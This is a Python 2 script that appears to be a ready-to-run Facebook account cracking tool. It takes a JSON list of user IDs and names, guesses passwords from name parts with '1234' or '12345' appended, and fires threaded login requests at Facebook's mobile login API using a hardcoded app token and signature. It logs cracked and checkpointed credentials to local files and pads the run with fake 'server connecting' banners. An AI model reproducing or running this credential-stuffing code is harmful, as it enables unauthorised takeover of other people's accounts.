import os,sys,time,datetime,re,random,hashlib,threading,json,getpass,urllib,cookielib,requests,json, re
from multiprocessing.pool import ThreadPool as th
from datetime import datetime

class Brute:

    def __init__(self):
        self.setpw = False
        self.ok = []
        self.cp = []
        self.loop = 0

    def bruteRequest(self, username, password):
        params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
           'format': 'JSON', 
           'sdk_version': '2', 
           'email': username, 
           'locale': 'en_US', 
           'password': password, 
           'sdk': 'ios', 
           'generate_session_cookies': '1', 
           'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
        try:
            os.mkdir('out')
        except:
            pass

        api = 'https://b-api.facebook.com/method/auth.login'
        response = requests.get(api, params=params)
        if re.search('(EAAA)\\w+', response.text):
            self.ok.append(username + '\n[ Password ] \033[1;97m' + password + '\n')
            save = open('out/successful.txt', 'a')
            save.write(str(username) + '  ' + str(password) + '\n')
            save.close()
            return True
        else:
            if 'touch.facebook.com' in response.json()['error_msg']:
                self.cp.append(username + '\n[ Password ] \033[1;97m' + password + '\n')
                save = open('out/checkpoint.txt', 'a')
                save.write(str(username) + '  ' + str(password) + '\n')
                save.close()
                return True
            return False

    def brute(self, users):
        if self.setpw == False:
            self.loop += 1
            for pw in users['pw']:
                username = users['id'].lower()
                password = pw.lower()
                try:
                    if self.bruteRequest(username, password) == True:
                        break
                except:
                    pass

                sys.stdout.write(('\r\x1b[0;97m [\x1b[0;94m{}\x1b[0;97m] \033[1;96mSERVER ViP \033[1;97m{}/\033[1;97m{}\x1b[0;92m Successfull \x1b[0;97m:\x1b[0;92m {}\x1b[0;91m Checkpoint \x1b[0;97m:\x1b[0;91m {} ').format(datetime.now().strftime('%H:%M:%S'),self.loop, len(self.target), len(self.ok), len(self.cp)))
                sys.stdout.flush()

        else:
            self.loop += 1
            for pw in self.setpw:
                username = users['id'].lower()
                password = pw.lower()
                try:
                    if self.bruteRequest(username, password) == True:
                        break
                except:
                    pass

                sys.stdout.write(('\r\x1b[0;97m [\x1b[0;94m{}\x1b[0;97m] Crack Started By Servered Vip {}/{}\x1b[0;92m OK \x1b[0;97m:\x1b[0;92m {}\x1b[0;93m CP \x1b[0;97m:\x1b[0;93m {} ').format(datetime.now().strftime('%H:%M:%S'), self.loop, len(self.target), len(self.ok), len(self.cp)))
                sys.stdout.flush()

    def main(self):
        while True:
            file = raw_input('\x1b[0;97m [\x1b[0;94m\xe2\x80\xa2\x1b[0;97m] Nawe Aw shwenay ka la user daya  \x1b[0;91m:\x1b[0;97m [\x1b[0;93m user/******.json\x1b[0;97m ]\n [\x1b[0;91m?\x1b[0;97m]\x1b[0;97m User/ ?\x1b[0;91m :\x1b[0;92m ')
            try:
                list = open(file, 'r').read()
                object = json.loads(list)
                break
            except IOError:
                print '\n\x1b[0;91m File\x1b[0;97m [ \x1b[0;92m%s\x1b[0;97m ]\x1b[0;91m Tidak Ada!' % file

        self.target = []
        for user in object:
            try:
                obj = user['name'].split(' ')
                if len(obj) == 1:
                    listpass = [obj[0] + '1234', obj[0] + '1234',
                     obj[0] + '12345']
                elif len(obj) == 2:
                    listpass = [obj[0] + '1234', obj[0] + '12345',
                     obj[1] + '1234', obj[1] + '12345']
                elif len(obj) == 3:
                    listpass = [obj[0] + '1234', obj[0] + '12345',
                     obj[1] + '1234', obj[1] + '1234',
                     obj[2] + '1234', obj[2] + '12345']
                elif len(obj) == 4:
                    listpass = [obj[0] + '1234', obj[0] + '12345',
                     obj[1] + '1234', obj[1] + '12345',
                     obj[2] + '1234', obj[2] + '12345',
                     obj[3] + '1234', obj[3] + '12345']
                else:
                    listpass = ['1234554321', '1122334455',
                     '123456654321', '112233445566',
                     '123456789']
                self.target.append({'id': user['uid'], 'pw': listpass})
            except:
                pass

        if len(self.target) == 0:
            exit('\x1b[0;91m\x1b[0;97mSelect [\x1b[0;92m %s \x1b[0;97m]' % file)
        ask = raw_input(' Enter Bka Bo joine Server ')
        os.system('clear')
        os.system('figlet Wait')
        time.sleep(5)
        os.system('clear')
        os.system('figlet Connecting Server')
        time.sleep(5)
        os.system('clear')
        os.system('figlet Wait')
        time.sleep(4)
        os.system('clear')
        os.system('figlet Connecting Server ViP')
        time.sleep(4)
        os.system('clear')
        os.system('figlet Connecting Server ViP')
        time.sleep(4)
        os.system('clear')
        os.system('figlet Connecting Server ViP')
        os.system('clear')
        os.system('figlet OK %50')
        time.sleep(4)
        os.system('clear')
        os.system('figlet SERVER ViP')
        time.sleep(7)
        os.system('figlet Conect krdn')
        time.sleep(5)
        os.system('clear')
        os.system('figlet Conecting      100%')
        time.sleep(5)
        os.system('clear')
        os.system('figlet SERVER ViP')
        if ask.lower() == 'mmmmbjguv':
            while True:
                print '\n\x1b[0;97m [\x1b[0;94m\xe2\x80\xa2\x1b[0;97m] \x1b[0;97mContoh Password\x1b[0;91m: \x1b[0;92msayang,doraemon,bangsat,kontol,bismillah,cantik\n'
                self.setpw = raw_input('\x1b[0;97m [\x1b[0;91m?\x1b[0;97m] \x1b[0;97m Password \x1b[0;91m:\x1b[0;92m ').strip().split(',')
                if self.setpw[0] != '':
                    break

        th(30).map(self.brute, self.target)
        self.results()
        exit()

    def results(self):
        if len(self.ok) != 0:
            print '\n\n\x1b[0;92mSuccessful \x1b[0;91m:\x1b[0;94m ' + str(len(self.ok))
            for i in self.ok:
                 print '[Successful]\033[1;97m '+str(i)
        if len(self.cp) != 0:
            print '\n\n\x1b[0;91mCheckpoint \x1b[0;91m:\x1b[0;92m ' + str(len(self.cp))
            for i in self.cp:
                print '[Checkpoint] \033[1;97m'+str(i)
        if len(self.cp) == 0 and len(self.ok) == 0:
            print '\n\x1b[0;96m Hichi nahena dwbara hawl bdawa\x1b[0m'
